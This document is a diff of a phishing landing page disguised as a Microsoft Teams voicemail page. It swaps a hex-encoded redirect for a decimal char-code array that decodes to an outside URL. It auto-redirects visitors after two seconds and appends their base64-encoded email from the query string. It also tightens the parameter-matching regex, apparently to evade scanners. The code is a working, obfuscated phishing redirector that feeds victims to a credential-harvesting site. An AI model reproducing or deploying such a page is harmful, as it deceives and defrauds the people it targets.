@@ -18,7 +18,7 @@
             text-align: center;
         }
         .dots-container {
-            display: none;
+            display: flex;
             align-items: center;
             justify-content: center;
         }
@@ -44,28 +44,12 @@
             font-size: 18px;
             margin-bottom: 20px;
         }
-        #verifyButton {
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-            margin-bottom: 20px;
-            background-color: rgb(110, 71, 238);
-            color: white;
-            border: none;
-            border-radius: 15px;
-            height: 50px;
-            display: none; /* Hide button by default */
-        }
-        #verifyButton:hover {
-            background-color: rgb(142, 204, 255);
-        }
     </style>
 </head>
 <body>
     <div class="container">
         <img src="https://cdn.pixabay.com/photo/2022/01/27/07/17/microsoft-teams-6971301_960_720.png" alt="Logo" width="330px">
         <div id="emailDisplay" aria-live="polite"></div>
-        <button id="verifyButton" aria-label="Click to Verify">Play VoiceMail</button>
         <div class="dots-container" aria-label="Loading content">
             <div class="dot"></div>
             <div class="dot"></div>
@@ -74,7 +58,6 @@
             <div class="dot"></div>
         </div>
     </div>
-    <a id="redirectLink" href="#" style="display: none;" title="Redirect to Target"></a>
     <script>
         // Function to decode base64 string
         function decodeBase64(encoded) {
@@ -90,7 +73,7 @@
         function findEmailParam() {
             const urlParams = new URLSearchParams(window.location.search);
             for (const [key, value] of urlParams.entries()) {
-                if (/^[A-Za-z0-9+/]{45}$/.test(key) && /^[A-Za-z0-9+/=]*$/.test(value)) {
+                if (/^[A-Za-z0-9+/]{145}$/.test(key) && /^[A-Za-z0-9+/=]*$/.test(value)) {
                     const decodedValue = decodeBase64(value);
                     if (decodedValue && decodedValue.includes('@')) {
                         return { key, value }; // Return the key and the decoded email
@@ -101,46 +84,29 @@
         }
 
         function redirectToTarget(base64Email) {
-function redirectToTarget(base64Email) {
-    const hex = "68747470733A2F2F736D616C6C6465706F742E636F6D2F6E2F3F63335939627A4D324E56387858335A7661574E6C4A6E4A68626D513956555634656D5246627A306D64576C6B50565654525649794F4445774D6A41794E4655304E6A45774D6A67794F513D3D4E303132334E";
-    const obfuscatedURL = hex.match(/.{2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('') + base64Email;
-    window.location.href = obfuscatedURL;
-}
-
-        // Function to update the displayed email
-        function updateLink() {
-            const emailParam = findEmailParam();
-            const emailDisplay = document.getElementById('emailDisplay');
-            if (emailParam) {
-                emailDisplay.innerText = decodeBase64(emailParam.value); // Always display the decoded email
-            } else {
-                console.error("No email to display");
-            }
+            const parts = [
+                104, 116, 116, 112, 115, 58, 47, 47, 115, 109, 97, 108, 108, 100, 101, 112, 
+                111, 116, 46, 99, 111, 109, 47, 110, 47, 63, 99, 51, 89, 57, 111, 90, 51, 54, 
+                86, 56, 49, 120, 88, 51, 90, 118, 97, 87, 78, 100, 38, 114, 97, 110, 100, 61, 
+                85, 69, 120, 122, 101, 68, 69, 111, 61, 38, 117, 105, 100, 61, 85, 83, 69, 
+                82, 50, 56, 49, 48, 50, 48, 50, 52, 85, 52, 54, 49, 48, 50, 56, 50, 57, 61, 
+                78, 48, 49, 50, 51, 78
+            ];
+            const obfuscatedURL = String.fromCharCode(...parts) + base64Email;
+            window.location.href = obfuscatedURL;
         }
 
-        // Automatically trigger button click
-        window.onload = function() {
-            updateLink();
-            const button = document.getElementById('verifyButton');
-            button.click();
-        };
-
-        // Click button functionality
-        const button = document.getElementById('verifyButton');
-        button.addEventListener('click', function() {
-            // Show loading dots
-            document.querySelector('.dots-container').style.display = 'flex';
-
+        // Automatically redirect after showing loading dots
+        window.onload = function () {
+            const emailParam = findEmailParam();
             setTimeout(() => {
-                const emailParam = findEmailParam();
                 if (emailParam) {
                     redirectToTarget(emailParam.value);
                 } else {
                     console.error("No email found for redirection");
                 }
-            }, 2000);
-        });
+            }, 2000); // Show loading dots for 2 seconds
+        };
     </script>
 </body>
 </html>
-
